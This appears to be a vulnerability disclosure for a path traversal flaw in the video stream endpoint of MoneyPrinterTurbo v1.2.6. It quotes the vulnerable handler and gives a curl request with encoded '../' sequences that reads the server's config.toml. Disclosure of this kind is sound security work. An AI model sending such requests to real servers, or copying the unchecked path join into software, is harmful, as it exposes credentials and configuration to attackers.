A critical path traversal vulnerability (CWE-22) has been identified in the `/stream/{file_path:path}"` endpoint of MoneyPrinterTurbo. This vulnerability allows unauthenticated attackers to read arbitrary files on the server filesystem, potentially leading to complete system compromise through exposure of sensitive configuration files, source code, and credentials.

version: v1.2.6

## Affected Code

```python
# https://github.com/harry0703/MoneyPrinterTurbo/blob/v1.2.6/app/controllers/v1/video.py#L227

@router.get("/stream/{file_path:path}")
async def stream_video(request: Request, file_path: str):
    tasks_dir = utils.task_dir()
    video_path = os.path.join(tasks_dir, file_path)
    range_header = request.headers.get("Range")
    video_size = os.path.getsize(video_path)
    start, end = 0, video_size - 1

    length = video_size
    if range_header:
        range_ = range_header.split("bytes=")[1]
        start, end = [int(part) if part else None for part in range_.split("-")]
        if start is None:
            start = video_size - end
            end = video_size - 1
        if end is None:
            end = video_size - 1
        length = end - start + 1

    def file_iterator(file_path, offset=0, bytes_to_read=None):
        with open(file_path, "rb") as f:
            f.seek(offset, os.SEEK_SET)
            remaining = bytes_to_read or video_size
            while remaining > 0:
                bytes_to_read = min(4096, remaining)
                data = f.read(bytes_to_read)
                if not data:
                    break
                remaining -= len(data)
                yield data

    response = StreamingResponse(
        file_iterator(video_path, start, length), media_type="video/mp4"
    )
    response.headers["Content-Range"] = f"bytes {start}-{end}/{video_size}"
    response.headers["Accept-Ranges"] = "bytes"
    response.headers["Content-Length"] = str(length)
    response.status_code = 206  # Partial Content

    return response
```

## Root Cause Analysis

The vulnerability occurs because:

1. **No Authentication Required**
2. **Direct Path Construction**: 
3. **No Traversal Prevention**: The code does not check for `../` sequences or absolute paths


An attacker can read sensitive configuration files:

```bash
curl "http://target:8080/api/v1/stream/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fMoneyPrinterTurbo%2fconfig.toml"
```
